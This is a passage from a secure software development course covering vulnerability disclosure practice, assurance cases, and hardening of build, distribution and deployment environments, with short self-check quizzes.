You should instead have a plan for handling when (not if) your cryptographic algorithms and protocols are broken. Make sure all your co-developers learn of this plan so that they will not ruin it (e.g., if you run an OSS project, put this in the **CONTRIBUTING.md** or equivalent file). In short, plan for change.

Similarly, seek advice from experts, and weigh that advice carefully. Errors in cryptographic systems can be devastating, and can last for many years because they are not obvious. Getting others’ review and constructive feedback is generally a good idea, but it is especially important when using cryptography.

#### Quiz 3.7: Other Topics in Cryptography

\>\>Select the true statement(s):<<

[!] Attackers cannot detect latency within an equality over a network.

[x] Where practical, you should minimize the time that normally-encrypted data is decrypted.

[ ] If powerful “general-purpose” quantum computers are developed, they will render all encryption algorithms useless. {{ selected: No. Such computers will render useless common *public-key* algorithms that are popular in 2020. However, while they will halve the effective bit length of symmetric encryption algorithms, they will not render them useless; a 256-bit key for a symmetric encryption algorithm will effectively become a 128-bit key, which is still adequately secure for most purposes. In addition, new public-key algorithms are being developed that resist attacks from such quantum computers. }}

# Other Topics

This chapter describes topics on the fundamentals of developing secure software that have not been covered elsewhere, including handling vulnerability disclosures, assurance cases, the basics after development, formal methods, and top vulnerability lists.

Learning objectives:

1. Understand how to properly handle vulnerability disclosures.

2. Discuss the basics of assurance cases.

3. Discuss the basics beyond development: distributing, fielding/deploying, operations, and disposal.

4. Get a brief introduction about formal methods.

5. Take a look at top vulnerability lists (e.g., OWASP Top 10 and CWE Top 25).

## Vulnerability Disclosures

### Receiving Vulnerability Reports

Unfortunately, even after your best efforts, someone may find a vulnerability in the software you have developed. In this unit, we will discuss receiving vulnerability reports, including how to prepare to receive vulnerability reports *before* vulnerabilities are found.

#### Product Security Incident Response Teams (PSIRTs)

If you are part of a team developing a large software application within a single organization, then you probably have or should consider forming a group to address security incidents related to that software. Such teams are sometimes called a Product Security Incident Response Team (PSIRT). The nonprofit Forum of Incident Response and Security Teams (FIRST) defines a PSIRT as *“an entity within an organization which... focuses on the identification, assessment and disposition of the risks associated with security vulnerabilities within the products, including offerings, solutions, components and/or services which an organization produces and/or sells”* ([FIRST](https://www.first.org/standards/frameworks/): *Product Security Incident Response Team (PSIRT) Services Framework* and *Computer Security Incident Response Team (CSIRT) Services Framework*). FIRST recommends that PSIRTs be formed while requirements are still being developed, but they should at least be formed before the initial release of the software. A properly-running PSIRT can identify and rapidly respond to an extremely serious vulnerability report.

PSIRTs often work with computer incident response teams (CSIRTs); a CSIRT is focused on the security of computer systems and/or networks that make up the infrastructure of an entire organization, while PSIRTs focus on specific products/services. Should you have one (or want to establish one), FIRST provides useful frameworks describing what PSIRTs and CSIRTs should do within an organization ([FIRST Services Framework](https://www.first.org/standards/frameworks/)).

Many governments and large companies also have their own requirements and guidelines for how to handle vulnerability reports. If your project is one of their efforts, you will need to follow those requirements and consider its guidelines.

A simple short guide is the [OWASP Vulnerability Disclosure Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Vulnerability_Disclosure_Cheat_Sheet.html). This short document provides useful guidance for both security researchers (who find security vulnerabilities) and organizations (who receive vulnerability reports).

There are many other useful documents that discuss vulnerability disclosure. In particular:

* [*The CERT Guide to Coordinated Vulnerability Disclosure*](https://vuls.cert.org/confluence/display/CVD/The+CERT+Guide+to+Coordinated+Vulnerability+Disclosure), by Allen Householder, 2019. In that document the “vendor” is the organization that releases the software and needs to learn about the security vulnerability.

* FIRST’s [*Guidelines and Practices for Multi-Party Vulnerability Coordination and Disclosure*](https://www.first.org/global/sigs/vulnerability-coordination/multiparty/guidelines-v1.1) [https://www.first.org/global/sigs/vulnerability-coordination/multiparty/guidelines-v1.1](https://www.first.org/global/sigs/vulnerability-coordination/multiparty/guidelines-v1.1)

The Open Source Security Foundation (OpenSSF) [Vulnerability Disclosures Working Group](https://github.com/ossf/wg-vulnerability-disclosures)
has developed a [Guide to coordinated vulnerability disclosure for open source software projects](https://github.com/ossf/oss-vulnerability-guide). If you maintain an OSS project, apply that guide so you’ll be prepared for vulnerability reports before they happen.


In the rest of this unit we will discuss some of the key issues for accepting vulnerability reports.

#### Publicly State How to Send Vulnerability Reports

You must tell others, publicly, how to send vulnerability reports… and this information must be extremely easy to find. Otherwise, potential reporters will not report vulnerabilities to you, or there may be a significant delay while the project tries to figure out how to receive a report. This is time wasted where time is often of the essence. In 2019, failure to publicly state how to send vulnerability reports was the #1 most common reason OSS projects did not earn the OpenSSF Best Practices *passing* badge ([*Core Infrastructure Initiative (CII) Best Practices Badge in 2019*](https://events19.linuxfoundation.org/wp-content/uploads/2018/07/cii-bp-badge-2019-03.pdf), by David A. Wheeler).

In one sense this requirement is easy. Decide what your reporting convention is, and make that information easy to find. Here are some common conventions:

1. Many companies and projects support an email address of the form **security@example.com** or **abuse@example.com**.

2. A common convention in OSS projects is to provide this information in a file named **SECURITY.md** in the repository’s root or **docs/** directory. Sites such as GitHub will highlight this file if present and encourage their creation. Add a link from your **README.md** file to this **SECURITY.md** file.

3. If the project has or implements a website, a common recommendation is to add a **security.txt** file on the website at **/security.txt** or **/.well-known/security.txt**. To learn more, visit [securitytxt.org](https://securitytxt.org/).

One challenge is that attackers are also very interested in getting vulnerability reports, because they want to exploit those vulnerabilities until everyone installs its fixes or mitigations. So, it is usually important to have some mechanism for reporting vulnerabilities that prevents attackers from also getting this information before a patch is distributed. This can sometimes be hard to do:

1. Email systems are generally not end-to-end encrypted. Email systems that support end-to-end encryption (e.g., OpenPGP and S/MIME) are not widely used, may be hard to use, and/or are primarily used only within specific communities.

2. Many other communication systems for 1-on-1 secure communication expect that the parties already know each other, which is often not the case in vulnerability reporting.

3. OSS projects generally work in the open, so normal reporting and discussion forums (such as issue trackers, chat systems, etc.) may allow many people (or everyone) to see the discussion about a vulnerability, even if it is not supposed to be publicly known.

If you don’t want attackers to immediately exploit vulnerabilities reported to you, you should use some sort of encryption for the initial report. One imperfect but useful solution is to use email systems that support STARTTLS. Most large email providers (like GMail) and many companies support STARTTLS. STARTTLS provides *transport layer encryption*, that is, the emails are encrypted *between* email relays. Transport layer encryption is not as secure as end-to-end encryption, because the emails are decrypted at various points. In addition, STARTTLS is often deployed as *opportunistic TLS* - meaning an active attacker who controls certain network routers or email relays may be able to disable this encryption for a period of time. That said, using email providers who support STARTTLS transparently provides protection from many of the most common kinds of attacks on communication, while being very easy to use.

You should also use encryption to communicate among the key developers if you don’t want attackers to know about what is going on. However, the developers often know each other, so this is usually much easier to accomplish.

#### Monitor for Vulnerabilities, Including Vulnerable Dependencies

As we have already mentioned, monitor for vulnerabilities about your software and all libraries embedded in it. You can use Google alerts to alert you about your software from various news sources. Use a software composition analysis (SCA) / origin analysis tool to alert you about newly-found publicly-known vulnerabilities in your dependencies.

As noted earlier, a software bill of materials (SBOM) is a nested inventory that identifies the software components that make up a larger piece of software. When an SBOM is available for a component you are using, it’s often easier to use that data to help detect known vulnerabilities. Many ecosystems have ecosystem-specific SBOM formats. There are also some SBOM formats that support arbitrary ecosystems: [Software Package Data Exchange (SPDX)](https://spdx.dev/), [Software ID (SWID)](https://csrc.nist.gov/Projects/Software-Identification-SWID/), and [CycloneDX](https://github.com/CycloneDX/specification).

#### Consider Creating a Bug Bounty Program

A widely-used technique to encourage vulnerability reporting is a *bug bounty program*, where you pay reporters to report about especially important defects. This can be a cost-effective way to encourage people to report vulnerabilities to you once all relatively “easy-to-find” vulnerabilities have been found and fixed. If you don’t want to manage such a program yourself, there are various companies that can do that for you for a fee.

Be sure to clearly establish the scope and terms of any bug bounty programs ([OWASP Vulnerability Disclosure](https://cheatsheetseries.owasp.org/cheatsheets/Vulnerability_Disclosure_Cheat_Sheet.html)). Specify what you will pay for, including a minimum and maximum range. For example, *“$X-$Y for a vulnerability that directly leads to a remote code execution without requiring login credentials.”* If there is a maximum that you can spend in a year, say so, and indicate the total amount, the calendar used, and what will happen to reports after the annual funding is used up. Also make it clear who is ineligible, e.g., developers of the software and/or employees of companies that develop the software.

However, beware: a bug bounty program can be an incredible waste of money unless the easy to find vulnerabilities are found and fixed first. As Katie Moussouris has noted, *“Not all bugs are created equal"*; many defects (such as most XSS defects) are easy to detect and fix, and *“you should be finding those bugs easily yourselves too.”* Using a bug bounty program to find easy-to-find vulnerabilities is extremely costly and *“is not appropriate risk management.”* She even noted a case where a company ended up paying a security researcher $29,000/hour to find simple well-known defects. Find and fix the simple bugs first, and *then* a bug bounty program may make sense ([*Relying on bug bounties ‘not appropriate risk management’: Katie Moussouris*](https://www.zdnet.com/article/relying-on-bug-bounties-not-appropriate-risk-management-katie-moussouris/), by Stilgherrian, 2019).

### Respond To and Fix the Vulnerability in a Timely Way

Of course, once a vulnerability report is received, it must be responded to and fixed in a timely way. OWASP recommends the following ([OWASP Vulnerability Disclosure](https://cheatsheetseries.owasp.org/cheatsheets/Vulnerability_Disclosure_Cheat_Sheet.html)):

* Respond to reports in a reasonable timeline.

* Communicate openly with researchers.

* [Do] not threaten legal action against researchers.

You need to be able to quickly triage vulnerability reports; some reports won’t apply to your software or are not really vulnerabilities. It is quite common to need to ask further questions to really understand the vulnerability.

#### Fixing the Vulnerability

Once you have determined that it really is a vulnerability, you will need to fix it.

If you want to be able to discuss reports in a constrained group - and most groups do - you should set that up ahead of time.

Ensure that you can quickly stand up a working test environment for any supported version and environment of the software. So make sure you have good version control of the source code, and also ensure that you can quickly stand up the development and test environments.

When fixing a security vulnerability, check to see if the same kind of vulnerability exists in similar situations in the software. Otherwise, you will end up creating many more patches.

If your update causes problems, people will reject it and learn to not accept any future updates from you. Any proposed fix must avoid backwards incompatibilities if at all possible. It must also be of high quality. This implies that you need to have a strong *automated* test suite before you release the software, and have any needed hardware to execute it (if the tests need special hardware). Add automated tests related to what you are changing, both to ensure that it really fixes the problem and also to verify that the change does not negatively affect anything else.

![image alt text](worst.png)

**Worst Thing That Could Happen**, retrieved from [xkcd.com](https://xkcd.com/2261/), licensed under [CC-BY-NC-2.5](https://creativecommons.org/licenses/by-nc/2.5/)

#### Limiting Disclosure and the FIRST Traffic Light Protocol (TLP)

When discussing a vulnerability, it is often important to discuss detailed information, yet simultaneously tell people to limit disclosure of some information for a period of time. In addition, it has become common for there to be multiple different parties involved in a vulnerability: there may be multiple suppliers (including vendors) who implement software with the vulnerability, distributors, and organizations involved in distributing information about the vulnerability.

FIRST developed a simple marking system for this called the [Traffic Light Protocol](https://www.first.org/tlp/) (TLP) that is often used to indicate to whom the information can be shared. Here is a brief summary. The TLP has four color values to indicate sharing boundaries, which are placed as follows:

1. In email: the TLP color is in the subject line and also in the body before the designated information.

2. In documents: the TLP color is in the header and footer of each page, typically right-justified.

The TLP color is shown in all-caps after “**TLP:**”, so you will see **TLP:RED**, **TLP:AMBER**, **TLP:GREEN**, or **TLP:WHITE**. These colors have the following meaning:

* **TLP:RED** = Not for disclosure, restricted to participants only.

* **TLP:AMBER** = Limited disclosure, restricted to participants’ organizations.

* **TLP:GREEN** = Limited disclosure, restricted to the community.

* **TLP:WHITE**  = Disclosure is not limited.



#### Get a CVE and Compute CVSS

You should request a CVE where appropriate and it has not already been requested ([OWASP Vulnerability Disclosure](https://cheatsheetseries.owasp.org/cheatsheets/Vulnerability_Disclosure_Cheat_Sheet.html)). Typically, you would start this process once you have verified that the report really is a vulnerability, and thus you would do it simultaneously with fixing it. If you request a CVE, you should also calculate the vulnerability’s Common Vulnerability Scoring System (CVSS) score. CVSS is a rough estimate of a vulnerability’s severity.

The reason for CVEs and CVSS is simple: organizations are overwhelmed with software updates, and they need information to help them prioritize updates. CVE and CVSS are not perfect, but they are widely used and depended on. The Ponemon Institute’s [*Costs and Consequences of Gaps in Vulnerability Responses*](https://www.servicenow.com/lpayr/ponemon-vulnerability-survey.html) (2019) survey found that:

* *“Almost half of respondents (48%) report that their organizations had one or more data breaches in the past two years.”*

* *“60% of breach victims said they were breached due to [a] known vulnerability where the patch was not applied”*

* *“CVSS scoring… is often the only metric of patch prioritization [even though it] leaves out asset criticality and systems as part of vulnerability response.”*

* *“44% of respondents say their organizations use automation to assist with vulnerability management and patching [(primarily prioritization and patching)]”*

* *“Automation reduces the time to respond to vulnerabilities… 80% of organizations… that use automation say they have the ability to respond to vulnerabilities in a shorter timeframe.”* However, this automation depends on a variety of factors, including (in most cases) having a CVE assigned when there is a vulnerability.

CVSS is widely used, because there is a need for clear prioritization, but CVSS is also widely criticized (for example, [*Broken vulnerabilities severities*](https://opensourcesecurity.io/2020/05/27/broken-vulnerability-severities/), by Josh Bressers, 2020). A new version of CVSS (beyond version 3), or a replacement for it, may be developed and/or become widely used in the future.

#### Release the Update and Tell the World

Once the fix is ready, release it. You will need to tell the world the software is fixed, and do all you can to encourage rapid uptake of the fixed version. OWASP recommends that suppliers publish clear security advisories and changelogs, and also that suppliers offer credit to the vulnerability finder ([OWASP Vulnerability Disclosure](https://cheatsheetseries.owasp.org/cheatsheets/Vulnerability_Disclosure_Cheat_Sheet.html)).

If there are workarounds that can be applied without updating the software, be sure to note those. This is particularly important if:

* there are likely to be many users who cannot update their software, or

* the vulnerability is publicly known, but the patch will not be released for some time.

Ensure that it is easy to automatically update to the fixed version of the software. If your software platform does not provide automated patch releases or installation, consider implementing one yourself. Users need to be able to quickly and automatically receive fixes, unless they have expressly opted out of updates.

Be sure to always credit and thank vulnerability reporters, unless they request otherwise. It is rude to not provide credit, and many vulnerability reporters provide reports *primarily* to get credit. What is worse, reporters may be less cooperative in the future if they do not receive appropriate credit.

#### Quiz 4.1: Respond To and Fix the Vulnerability in a Timely Way

\>\>What is the meaning of **TLP:RED**?<<

(!x) Not for disclosure, restricted to participants only.

( ) Limited disclosure, restricted to participants’ organizations.

( ) Limited disclosure, restricted to the community.

( ) Disclosure is not limited.

### Sending Vulnerability Reports to Others

Once you have completed this course, you are far more likely to be able to detect vulnerabilities in software. In this unit, we will discuss how to send vulnerability reports to others.

The [OWASP Vulnerability Disclosure Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Vulnerability_Disclosure_Cheat_Sheet.html) recommends that security researchers (who find security vulnerabilities) should:

* Ensure that any testing is legal and authorized.

* Respect the privacy of others.

* Make reasonable efforts to contact the security team of the organization.

* Provide sufficient details to allow the vulnerabilities to be verified and reproduced.

* Not demand payment or rewards for reporting vulnerabilities outside of an established bug bounty program.

Reporting a vulnerability that you have found can be surprisingly complicated. If there is a single supplier, you could report to just that supplier. But sometimes there are multiple suppliers and other stakeholders involved. There are also various ways you can choose to report a vulnerability.

#### Reporting Models

There are several different kinds of disclosure models:

1. **Private Disclosure**<br>*“In the private disclosure model, the vulnerability is reported privately to the organisation. The organisation may choose to publish the details of the vulnerabilities, but this is done at the discretion of the organisation, not the researcher, meaning that many vulnerabilities may never be made public. The majority of bug bounty programs require that the researcher follows this model. The main problem with this model is that if the vendor is unresponsive, or decides not to fix the vulnerability, then the details may never be made public. Historically this has led to researchers getting fed up with companies ignoring and trying to hide vulnerabilities, leading them to the full disclosure approach.”* ([OWASP Vulnerability Disclosure](https://cheatsheetseries.owasp.org/cheatsheets/Vulnerability_Disclosure_Cheat_Sheet.html))

2. **Full Disclosure**<br>*“With the full disclosure approach, the full details of the vulnerability are made public as soon as they are identified. This means that the full details (sometimes including exploit code) are available to attackers, often before a patch is available. The full disclosure approach is primarily used in response to organizations ignoring reported vulnerabilities, in order to put pressure on them to develop and publish a fix. This makes the full disclosure approach very controversial, and it is seen as irresponsible by many people. Generally it should only be considered as a last resort, when all other methods have failed, or when exploit code is already publicly available”* ([OWASP Vulnerability Disclosure](https://cheatsheetseries.owasp.org/cheatsheets/Vulnerability_Disclosure_Cheat_Sheet.html)). Another reason to consider full disclosure is if there is reason to believe that the supplier is intentionally malicious; reporting a vulnerability to only a malicious supplier gives the malicious supplier more time to exploit the vulnerability.

3. **Coordinated Disclosure (historically called Responsible Disclosure)**<br>Coordinated disclosure *“attempts to find a reasonable middle ground between these two approaches. … the initial report is made privately, but with the full details being published once a patch has been made available (sometimes with a delay to allow more time for the patches to be installed).”* ([OWASP Vulnerability Disclosure](https://cheatsheetseries.owasp.org/cheatsheets/Vulnerability_Disclosure_Cheat_Sheet.html)). Historically, this has been called *responsible disclosure*, but this is a biased term, and its original coiner now recommends calling it coordinated disclosure instead. It is **important** that there is a **time limit** before the vulnerability will be unilaterally disclosed. Without a time limit this is essentially identical to private disclosure, since the supplier may have little incentive to fix the vulnerability.

4. **Disclosure to Attackers**<br>Some researchers work for organizations who attack others’ systems. Other researchers sell vulnerabilities to such organizations, or to brokers who then sell the vulnerabilities on. Doing this is controversial, especially when they are sold to brokers who do not clearly disclose exactly who is buying the vulnerabilities. The impact of doing this varies, because there is great variety in organizations who pay for vulnerabilities. These organizations include law enforcement in various countries, militaries in various countries, organized crime, and/or terrorist groups. Anyone who provides vulnerabilities to attackers should consider the ethical implications. In particular, you should consider what the attackers are likely to do with these vulnerabilities. Do you have confidence that the attackers will not use the vulnerabilities in contravention of human rights? Will they harm certain people or groups such as ethnic minorities, political dissidents, or journalists? If you disclose vulnerabilities to attackers, then you are supporting how these organizations will use those vulnerabilities to attack others; you should be confident that they will use them for good.

From here on we will presume that you follow a *coordinated disclosure model* with some limited timeframe.

Coordinated disclosure time limits (aka *embargo periods*) vary greatly. This time limit is the amount of time between when a reporter reports the vulnerability to the supplier and the reporter will unilaterally disclose it to the public. In general, suppliers push for longer time limits or no time limits, often because that will lower their costs (possibly to nothing if the supplier can get the time limit extended so the supplier never needs to fix the vulnerability). Organizations charged with protecting the public and multi-party organizations tend to press for shorter time limits. Some vulnerabilities are easier to fix than others, which makes simple numbers difficult to choose. Here are some examples of public disclosure time limits:

* [linux-distros](https://oss-security.openwall.org/wiki/mailing-lists/distros): less than 7 days preferred, up to 14 days allowed, up to 19 days if Thu/Fri report & disclosure on Mon/Tue

* [oCERT](http://ocert.org/): 14 days standard; 7 days if trivial, 30 days if critical/complex, up to 2 months “extremely exceptional”

* [CERT/CC](https://www.cert.org/vulnerability-analysis/vul-disclosure.cfm): 45 days “regardless of the existence… of patches or workarounds… Extenuating circumstances … may result in earlier or later disclosure... We will not distribute exploits”

* [Google Project Zero](https://googleprojectzero.blogspot.com/p/vulnerability-disclosure-faq.html): 90 days.

#### Further Information

A good source for more information is FIRST’s “[Guidelines and Practices for Multi-Party Vulnerability Coordination and Disclosure](https://www.first.org/global/sigs/vulnerability-coordination/multiparty/guidelines-v1.1)”. Historically many documents have focused on simple bi-lateral coordination between a security researcher and a software supplier, but today there are often complexities due to the need for multi-party coordination. This FIRST document discusses these more complex situations, and provides guidelines for addressing them.

## Miscellaneous

### Assurance Cases

Sadly, you cannot just do one thing and make a system secure. Instead, you need to do a variety of things. Tracking the various techniques you need to do, to ensure that you are really addressing everything you think you should, can become overwhelming… especially if your software gets large or there are expectations of strong security. In addition, sometimes potential stakeholders (such as users) want to understand what you are doing in order to determine if you are doing enough for their purposes. An unstructured list of “*things that were done*” does not really help when a system gets larger; you might do many things, but fail to address something important.

A practical alternative is creating an *assurance case*. An assurance case *“includes a top-level  claim for a property of a system or product (or set of claims), systematic argumentation regarding this claim, and the evidence and explicit assumptions that underlie this argumentation”* ([ISO/IEC 15026-2:2011](https://www.iso.org/standard/52926.html)). Let’s look at that definition; put another way, an assurance case includes:

* Claim(s): Top-level claim(s) for a property of a system or product. That is, something that you want to be true.

* Arguments: A systematic argumentation justifying this claim.

* Evidence/assumptions: Evidence and explicit assumptions underlying the argument.

The point of an assurance case is that it is *systematic*. In other words, you should start with whatever claim(s) you want to make that are important, and repeatedly break that down to show that the claim is true. Imagine that you are a lawyer trying to make a case to a skeptical jury; your job is to justify that the claim(s) are true. Creating an assurance case helps you determine and justify to people that the software is secure, both to others and yourself.

An assurance case does not have to be in any particular form. However, they are often documents with figures showing the high-level structure, and text providing the details. That is simply because it is easy to glance at the figures to see how things work together, but the text provides the details to really understand things.

Let’s talk about one way to create an assurance case, based on material from [*A Sample Security Assurance Case Pattern*](https://www.ida.org/-/media/feature/publications/a/as/a-sample-security-assurance-case-pattern/p-9278.ashx) by David A. Wheeler (2018). Let’s say that we have an overall claim: we want to claim that our “system is adequately secure against moderate threats”. Let’s argue that we can provide adequate proof of this if our security requirements are identified and met by its functionality, and that security is implemented by system life cycle processes. We can break down the security requirements further into our security requirement triad (confidentiality, integrity, and availability), properly handling access control, and identifying and addressing the assets and threat actors. Here is a figure that shows the top level of an assurance case:

![image alt text](top_assurance_case.png)

**Sample top level of an assurance case**, by David A. Wheeler (2018)

We could then repeatedly break each item down further. For example, we might divide the lifecycle processes into areas like design, implementation, and verification. We could then explain how we address security in each:

* For design, we might show that we followed all the Saltzer & Schroeder (S&S) design principles we have already discussed.

* For implementation, we might show that we countered all the “top” vulnerabilities identified by some widely-accepted and relevant list of top vulnerabilities.

* For verification, we might show that we use a variety of tools to detect vulnerabilities before the software is released.

For a detailed discussion and template for creating an assurance case, see [*A Sample Security Assurance Case Pattern*](https://www.ida.org/-/media/feature/publications/a/as/a-sample-security-assurance-case-pattern/p-9278.ashx) by David A. Wheeler (2018). If you would like to see an actual example, you can see the [OpenSSF Best Practices BadgeApp assurance case](https://github.com/coreinfrastructure/best-practices-badge/blob/master/doc/security.md).

When do you end? The usual answer is when the stakeholders agree that it is enough. If they don’t think it is enough, then ask them what would be enough and if they are willing to pay for those changes. If they are not paying you enough, then you don’t need to do it.

What is great about an assurance case is that if someone later wants to know “is this software adequately secure”, they can simply review the assurance case. Simply *having* an assurance case provides a lot of confidence, because it shows that someone thought through what the system is supposed to do and has a reasonable argument (with evidence) that the claims are correct.

#### Quiz 4.2: Assurance Cases

\>\>Select the true statement(s):<<

[!x] A claim describes an important property that you want to be true for a system or product

[x] An assurance case should repeatedly break down a claim until you can show that it is true by showing that each part is true.

[x] In principle, an assurance case is repeatedly drilled down until the stakeholders agree that enough has been done (e.g., because they are unwilling to pay for more).

### Harden the Development Environment (Including Build and CI/CD Pipeline) & Distribution Environment

Most attacks occur when a system is deployed, but increasingly attackers are attacking systems during their development and distribution. For our purposes, the “development environment” includes the set of all machines and other infrastructure used to develop the software, including each developer’s systems, version control system(s), build systems, CI/CD pipelines, and so on.  The “distribution environment” is the environment used to distribute the resulting built software, e.g., package registries/repositories, container registries/repositories, and so on. It’s important to secure the development environment and distribution environment against unauthorized access or compromise. This includes protecting them against the insertion of malicious code. Assume that attackers are attempting to subvert any system used for software development or distribution, especially any shared systems.

First, minimize privileges. Limit who can control these environments, and by how much. If someone leaves a project and/or organization, remove their privileges; even if they wouldn’t attack, an attacker might acquire their credentials. Limit the privileges given the environments, for example, if a CI/CD pipeline is given an authentication token, provide a token with the minimum privileges necessary so that if the token is exposed the damage is reduced. If a token is only needed in some cases (such as only when processing certain branches like “main”), only provide the token in those cases.

One simple approach is to have developers use multi-factor authentication (MFA) tokens (aka keys) when accessing development environments. These are hardware devices that prove that the developer possesses the device, and since they are single-purpose they are hard for attackers to subvert. If you must use passwords, ensure they are long and not shared between people.

Consider using “branch protection” or similar, if your version control system supports it, to restrict operations that can occur on certain branches (such as “main”). For example, you can ensure that a merge request/pull request has received human review and that it has passed automated checks before the proposed change can be accepted. Protected branches can also prevent dangerous operations such as force pushes, overwrites of commit histories, and similar changes.

Where practical, harden the development environment and distribution environment so they are harder to attack. In many projects, many or all parts of these environments are hosted elsewhere (often in a cloud); make sure the hosting system you choose has adequate security. Once chosen, consult the documentation for the systems you use and configure them to maximize security, e.g., to minimize privileges granted to others. For example, if you use GitHub, look at the [GitHub documentation on securing your repository](https://docs.github.com/en/code-security/getting-started/securing-your-repository). If you have a GitLab installation, [look at the GitLab documentation on securing your installation (“security”)](https://docs.gitlab.com/ee/security/).

The build process should be fully scripted/automated. That way builds will be performed predictably each time. Where possible, the build system should provide provenance information, that is, record what components were included in the build and ideally what components were used to perform the build. Be careful when logging a build process; often you want to avoid recording in log files any secrets like active authentication tokens.

Build, verification, and distribution processes (including CI/CD pipelines) often bring in many other reusable software components. Make sure you apply the good practices discussed in the course sections on (1) [Selecting (Evaluating) Open Source Software](#selecting-evaluating-open-source-software) and (2) [Downloading and Installing Reusable Software](#downloading-and-installing-reusable-software).

Supply chain Levels for Software Artifacts, or SLSA (“salsa”), is a security framework being developed as a checklist of standards and controls to prevent tampering, improve integrity, and secure packages and infrastructure. At the time of this writing it is still in development, but you should consider its recommendations. SLSA is being developed under the Open Source Security Foundation (OpenSSF). To learn more, see the SLSA home page at <https://slsa.dev/>.

Another source for good ideas on hardening development environments against attack, as well as many other approaches for improving security, are in [Software Supply Chain Best Practices](https://github.com/cncf/tag-security/raw/main/supply-chain-security/supply-chain-security-paper/CNCF_SSCP_v1.pdf) from the Cloud Native Computing Foundation (CNCF).

If an attacker manages to subvert the build process, the subverted results are often difficult to detect. A strong countermeasure to this attack is a verified reproducible build. A build is reproducible “if given the same source code, build environment and build instructions, any party can recreate bit-by-bit identical copies of all specified artifacts” (as defined in [“Definitions” from the Reproducible Builds project](https://reproducible-builds.org/docs/definition/)). A reproducible build is also called a deterministic build. A verified reproducible build is simply a build that’s been independently verified to be a reproducible build (on different computer(s)). Verified reproducible builds make attacking the build process much harder, because the attacker must then subvert multiple independent build systems to successfully subvert building the software.

Many builds are reproducible without any changes, however, some are not. The first step in creating a reproducible build is often to verify that if you do the same build twice on the sam system it produces the same result (a *repeatable* build). Using a container image (like a Docker image) or virtual image for the environment can help create a consistent environment for performing reproducible builds. Here are some common challenges in creating reproducible builds:

* The build result may include date/timestamps. If they can’t be easily removed, a common solution is to use the last modification of something (usually the source code) to set the date/timestamps in any result (using mechanisms such as the `SOURCE_DATE_EPOCH` environment variable).
* Some values can be in an “arbitrary” order (e.g., due to parallel execution). A common solution is to sort the results (e.g., lexicographically).

More information on how to create reproducible builds is available; see [“Documentation” from the Reproducible Builds project](https://reproducible-builds.org/docs/).

> 😱 STORY TIME: Subversion of SolarWinds Orion’s Build System

> Orion is an enterprise network management software suite from SolarWinds that includes performance and application monitoring as well as network configuration management. In 2020 a threat actor modified the Orion build system so that built versions of Orion would include malicious code. This subverted built system was then signed by the legitimate SolarWinds code signing certificate. This subversion was very damaging; the US government’s Cybersecurity & Infrastructure Security Agency (CISA) even issued an emergency directive (“[Emergency Directive 21-01]](<https://www.cisa.gov/emergency-directive-21-01>)” from CISA). Many security countermeasures couldn’t work in this case; “review code” didn’t work (the change was inserted by the build system and thus not seen by its developers), “check for signatures” didn’t work (it was legitimately signed), and monitoring for problems did not work for a while (because in many organizations this was the monitoring system). For more information, see [Alert AA20-352A](https://www.cisa.gov/emergency-directive-21-01) from CISA and “[Preventing Supply Chain Attacks like SolarWinds](https://linuxfoundation.org/blog/preventing-supply-chain-attacks-like-solarwinds/)” by David A. Wheeler.

🔔 Hardening the CI/CD pipeline against unauthorized access, malicious code, or system compromise is part of 2021 OWASP Top 10 #8 (A08:2021), *Software and Data Integrity Failures*.

### Distributing, Fielding/Deploying, Operations, and Disposal

No course can teach everything. This course focuses on *developing* secure software, including its distribution. We have intentionally not focused on processes after development, including distributing, fielding (deploying), operations, and disposal of software. One reason is that there are already many documents and guidelines that try to help people do this securely, but these efforts are hampered because they are trying to twiddle configuration knobs to turn insecure software into secure software. It is generally far more effective, if you want a secure system, to start with secure software.

Of course, distributing, deployment, operations, and disposal all matter. Many projects apply a DevOps or DevSecOps approach, which intentionally blend these processes together with development. Even if development is done by a different group, having secure distribution, fielding, operations, and disposal is critical for software to be secure in the real world. So while this course does not focus on these processes, here are a few tips on these processes that may help you.

When distributing:

* Use HTTPS (TLS), so that people can verify that it is the intended domain and the information cannot be manipulated between the server and recipient.

* Where practical, sign the distributed information using a private key *not* available to the server that is distributing the software. Ideally software releases should be signed by a private key that is never available on the Internet. That enables external verification (using the corresponding public key) even if the server is compromised. Unfortunately, this requires ensuring that public keys are securely distributed to the receivers. In some cases, ensuring that the receivers have the correct public keys can be a challenging problem, while in other cases this is easy. A common solution for software updates is to accept an update if it is signed by the same key that signed the currently-installed version of the software. The sigstore project is working to develop easier ways to sign and verify software artifacts; for more information, see <https://www.sigstore.dev/>.

* If you are distributing an application, arrange to have it updated by default (though allow the user to override this). Users often won’t update unless it’s automatic. There is a risk that an attacker may subvert your build or distribution process, so protect those processes and ensure that updates are only accepted if they are signed by a private key that is never connected to the Internet.

Note that our earlier discussion about software acquisition discussed distribution problems from the opposite side. That is, when acquiring software you want to ensure that you receive what you were supposed to receive, and when distributing software you want to make it easy for recipients to verify this.

Again, consider the recommendations of Supply chain Levels for Software Artifacts, or SLSA (“salsa”), at <https://slsa.dev/>.

When fielding/deploying:

* Configure your production environment to be secure, including all components you depend on, and keep it updated. For example:

  * Your environment should be configured to provide least privilege and use maximum security settings your system allows.

  * Beware of *“insecure default configurations, incomplete or ad hoc configurations, open cloud storage, misconfigured HTTP headers, and verbose error messages containing sensitive information”* (as OWASP notes).

  * Harden your environment by maximally enabling security countermeasures and eliminating unused components (so their vulnerabilities cannot be exploited). These components include your operating systems, database systems, virtual machine monitor, virtual machines, container runtime infrastructure, containers, and anything else you use or depend on. There are many documents that discuss how to harden various components; use them!

  * Where it is reasonable, enable automatic updates.

* Avoid giving direct access to your database unless it is necessary *and* you have verified it is secure.

* Ensure that all data sets have *limited* privilege. In particular, if you use AWS S3 buckets for non-public data, ensure that they have very limited access (many S3 buckets with non-public data have been made publicly readable).

* Where it makes sense, enable full disk encryption and/or database encryption.

* Enable monitoring systems that will warn you, or automatically update, when a component in use has a known vulnerability.

* Turn on logging and redirect it to a central protected location for monitoring. Enable automated systems to detect and warn about likely security problems.

When operating:

* Update components in a timely way (this is sometimes called *patch and vulnerability management*). In some organizations this job is split between developers who update components within an application and operators who update external components depended on by the application. No matter how you do it, components need to be updated in a timely way or an attacker will be able to exploit them.

* Examine warnings and/or logs routinely. Determine which ones are indicators of an incident.

* Respond in a timely way to incidents.

